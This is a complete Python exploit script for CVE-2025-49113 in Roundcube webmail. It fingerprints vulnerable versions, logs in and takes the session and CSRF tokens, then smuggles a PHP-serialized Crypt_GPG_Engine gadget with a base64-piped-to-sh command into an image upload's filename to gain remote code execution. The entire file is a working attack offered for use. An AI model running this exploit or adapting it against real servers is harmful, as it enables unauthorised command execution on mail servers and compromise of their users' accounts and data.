import requests
import re
import base64
import sys
import uuid
from urllib.parse import urlencode

class CryptGPGEngine:
    def __init__(self, gpgconf):
        self._process = False
        self._gpgconf = ""
        self._homedir = ""
        gpgconf_encoded = base64.b64encode(gpgconf.encode()).decode()
        self._gpgconf = f'echo "{gpgconf_encoded}"|base64 -d|sh;#'
        print(f"Decoded command: {base64.b64decode(gpgconf_encoded).decode()}")
    
    def gadget(self):
        # Mimic PHP serialize() output for Crypt_GPG_Engine object
        serialized = f'O:16:"Crypt_GPG_Engine":3:{{s:8:"_process";b:0;s:8:"_gpgconf";s:{len(self._gpgconf)}:"{self._gpgconf}";s:8:"_homedir";s:0:"";}}'
        return '|' + serialized + ';'

def check_version(base_url):
    print("[*] Checking Roundcube version...")
    
    headers = {
        'User-Agent': 'Roundcube exploit CVE-2025-49113 - Hakai Security'
    }
    
    try:
        response = requests.get(base_url, headers=headers, allow_redirects=False)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"[-] Error: Failed to check version. {e}")
        sys.exit(1)
    
    vulnerable_versions = [
        '10500', '10501', '10502', '10503', '10504', '10505', '10506', '10507', '10508', '10509',
        '10600', '10601', '10602', '10603', '10604', '10605', '10606', '10607', '10608', '10609', '10610'
    ]
    
    match = re.search(r'"rcversion":(\d+)', response.text)
    
    if not match:
        print("[-] Error: Could not detect Roundcube version.")
        sys.exit(1)
    
    version = match.group(1)
    print(f"[*] Detected Roundcube version: {version}")
    
    if version in vulnerable_versions:
        print("[+] Target is vulnerable!")
        return True
    else:
        print("[-] Target is not vulnerable.")
        sys.exit(1)

def login(base_url, user, pass_):
    headers = {
        'User-Agent': 'Roundcube exploit CVE-2025-49113 - Hakai Security'
    }
    
    try:
        session = requests.Session()
        response = session.get(base_url, headers=headers, allow_redirects=False)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Error: Failed to obtain the initial page. {e}")
        sys.exit(1)
    
    # Extract session cookie
    session_cookie = session.cookies.get('roundcube_sessid')
    if not session_cookie:
        print("Error: 'roundcube_sessid' cookie not found.")
        sys.exit(1)
    
    # Extract CSRF token
    match = re.search(r'"request_token":"([^"]+)"', response.text)
    if not match:
        print("Error: CSRF token not found.")
        sys.exit(1)
    
    csrf_token = match.group(1)
    
    url = f"{base_url}/?_task=login"
    data = {
        '_token': csrf_token,
        '_task': 'login',
        '_action': 'login',
        '_timezone': 'America/Sao_Paulo',
        '_url': '',
        '_user': user,
        '_pass': pass_
    }
    
    headers['Content-Type'] = 'application/x-www-form-urlencoded'
    
    try:
        response = session.post(url, data=urlencode(data), headers=headers, allow_redirects=False)
    except requests.RequestException as e:
        print(f"Error: Failed to make the request. {e}")
        sys.exit(1)
    
    if response.status_code == 401:
        print("Error: Incorrect credentials.")
        sys.exit(1)
    elif response.status_code != 302:
        print(f"Error: Request failed with status code {response.status_code}.")
        sys.exit(1)
    
    # Extract auth cookie
    auth_cookie = session.cookies.get('roundcube_sessauth')
    if not auth_cookie:
        print("Error: 'roundcube_sessauth' cookie not found.")
        sys.exit(1)
    
    session_cookie = session.cookies.get('roundcube_sessid')
    if not session_cookie:
        print("Error: 'roundcube_sessid' cookie not found.")
        sys.exit(1)
    
    print("[+] Login successful!")
    
    return {
        'sessionCookie': f'roundcube_sessid={session_cookie}',
        'authCookie': f'roundcube_sessauth={auth_cookie}'
    }

def upload_image(base_url, session_cookie, auth_cookie, gadget):
    upload_url = f"{base_url}/?_task=settings&_framed=1&_remote=1&_from=edit-!xxx&_id=&_uploadid=upload1749190777535&_unlock=loading1749190777536&_action=upload"
    
    base64_image = 'iVBORw0KGgoAAAANSUhEUgAAAIAAAABcCAYAAACmwr2fAAAAAXNSR0IArs4c6QAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAICgAwAEAAAAAQAAAFwAAAAAbqF/KQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAAAWBJREFUeAHt1MEJACEAxMDzSvEn2H97CrYx2Q4Swo659vkaa+BnyQN/BgoAD6EACgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B6gAHADOH4PUAC4ARy/BygA3ACO3wMUAG4Ax+8BCgA3gOP3AAWAG8Dxe4ACwA3g+D1AAeAGcPweoABwAzh+D1AAuAEcvwcoANwAjt8DFABuAMfvAQoAN4Dj9wAFgBvA8XuAAsAN4Pg9QAHgBnD8HqAAcAM4fg9QALgBHL8HKADcAI7fAxQAbgDH7wEKADeA4/cABYAbwPF7gALADeD4PUAB4AZw/B4AD+ACXpACLpoPsQQAAAAASUVORK5CYII='
    
    try:
        file_content = base64.b64decode(base64_image)
    except base64.binascii.Error:
        print("Error: Failed to decode the base64 image.")
        sys.exit(1)
    
    boundary = str(uuid.uuid4())
    data = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="_file[]"; filename="{gadget}"\r\n'
        f'Content-Type: image/png\r\n\r\n'
        f'{file_content.decode("latin1")}\r\n'
        f'--{boundary}--\r\n'
    )
    
    headers = {
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Cookie': f'{session_cookie}; {auth_cookie}',
        'User-Agent': 'Roundcube exploit CVE-2025-49113 - Hakai Security'
    }
    
    print("[*] Exploiting...")
    
    try:
        response = requests.post(upload_url, data=data.encode('latin1'), headers=headers, allow_redirects=False)
        response.raise_for_status()
        print(f"Upload response: {response.text}")
    except requests.RequestException as e:
        print(f"Error: Failed to send the file. {e}")
        sys.exit(1)
    
    if response.status_code != 200:
        print(f"Error: File upload failed with status code {response.status_code}.")
        sys.exit(1)
    
    print("[+] Gadget uploaded successfully!")

def exploit(base_url, user, pass_, rce_command):
    print("[+] Starting exploit (CVE-2025-49113)...")
    
    check_version(base_url)
    
    gpg_engine = CryptGPGEngine(rce_command)
    gadget = gpg_engine.gadget()
    print(f"Gadget: {gadget}")  # Debug gadget output
    
    gadget = gadget.replace('"', '\\"')
    
    cookies = login(base_url, user, pass_)
    
    upload_image(base_url, cookies['sessionCookie'], cookies['authCookie'], gadget)

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python exploit.py <url> <username> <password> <command>")
        sys.exit(1)
    
    base_url = sys.argv[1]
    user = sys.argv[2]
    pass_ = sys.argv[3]
    rce_command = sys.argv[4]
    
    exploit(base_url, user, pass_, rce_command)